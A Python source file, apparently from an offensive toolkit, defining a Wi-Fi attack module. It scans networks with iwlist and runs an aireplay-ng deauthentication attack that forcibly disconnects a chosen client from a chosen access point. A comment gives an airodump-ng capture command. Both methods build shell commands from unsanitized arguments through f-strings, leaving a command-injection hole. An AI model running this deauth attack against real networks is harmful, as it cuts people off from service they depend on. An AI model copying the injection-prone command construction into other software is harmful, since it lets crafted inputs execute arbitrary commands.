from ..system import SystemControl

class WirelessModule:
    """
    Wi-Fi Attacks: Scanning, Deauth.
    """
    def __init__(self, system_control):
        self.system = system_control

    def scan_networks(self, interface):
        """
        Uses airodump-ng.
        Note: Needs monitor mode first (handled by NetworkControl).
        """
        # This interactive tool is hard to wrap blindly.
        # Alternatively: 'iwlist wlan0 scan' (managed mode)
        # Or 'airodump-ng wlan0mon -w scan --output-format csv' (monitor)
        
        # Simple scan
        return self.system.execute(f"iwlist {interface} scan")

    def deauth_target(self, bssid, client_mac, interface, count=10):
        """
        aireplay-ng --deauth 10 -a [BSSID] -c [CLIENT] wlan0mon
        """
        cmd = f"aireplay-ng --deauth {count} -a {bssid} -c {client_mac} {interface}"
        return self.system.execute(cmd)
